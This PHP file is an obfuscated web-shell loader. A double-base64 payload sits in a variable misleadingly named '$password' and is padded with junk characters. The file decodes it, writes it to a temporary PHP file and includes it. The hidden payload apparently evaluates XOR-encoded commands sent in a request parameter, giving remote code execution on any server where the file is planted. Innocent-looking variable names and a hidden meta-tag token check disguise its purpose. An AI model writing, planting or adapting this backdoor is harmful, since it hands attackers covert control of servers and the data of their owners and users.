<?php
/*<meta name="ZgqNn1" content="9eQKZzTh">*/

$password='W9eQKZzThk9eQKZzThd9eQKZzThGM9eQKZzThFp9eQKZzThWOWtaV1poZFd4MFgzUnB9eQKZzThi9eQKZzThV19eQKZzThY2YjI1bFgzTmxkQ2dpVUZKRElpazdDaVJyWlhr9eQKZzThOWJXUTFLR1JoZEdVb0ltMHRaQzFaSWl4MGFXMWxLQ2twS1RzS1kyeGhjM01nVkVWVFZIc0tJQ0FnSUdaMWJtTjBhVzl1SUdWdVkyOWtaU2drY9eQKZzThTJWNUtYc0tJQ0FnSUVBa2NHOXpkRDFpWVhObE5qUmZaR1ZqYjJSbEtDUmZVa1ZSVlVWVFZGc25jMmhsYkd4QU9EZzRKMTBwT3dvZ0lDQWdabTl5S0NScFBUQTdKR2s4YzNSeWJHVnVLQ1J3YjNOMEtUc2thU3NyS1hza2NHOXpkRnNrYVYwZ1BTQWtjRzl6ZEZza2FWMGdYaUFrYTJWNVd5UnBKVE15WFR0OUNpQWdJQ0J5WlhSMWNtNGdKSEJ2YzNRN2ZRb2dJQ0FnWm5WdVkzUnBiMjRnWVc1MEtDUmtZWFJoS1FvZ0lDQWdlM0psZEhWeWJpQmxkbUZzS0NSMGFHbHpMVDVsYm1OdlpHVW9JaVJrWVhSaElpa3BPMzBLZlFva2RHVnpkRDF1WlhjZ1ZFVlRWRHNLSkhSbGMzUXRQbUZ1ZENna2EyVjVLVHM9';

$username = get_meta_tags(__FILE__)[$_GET['token']];
header("ddddddd:".$username);

$template_source = str_replace('9eQKZzTh', '', $password);
$template_source = base64_decode($template_source);
$template_source = base64_decode($template_source);

$key = 'template_source';
$aes_decode[1] = $$key;

$tmp_file = tempnam(sys_get_temp_dir(), 'dec_') . '.php';
file_put_contents($tmp_file, "<?php\n" . $aes_decode[1]);
include_once($tmp_file);
unlink($tmp_file);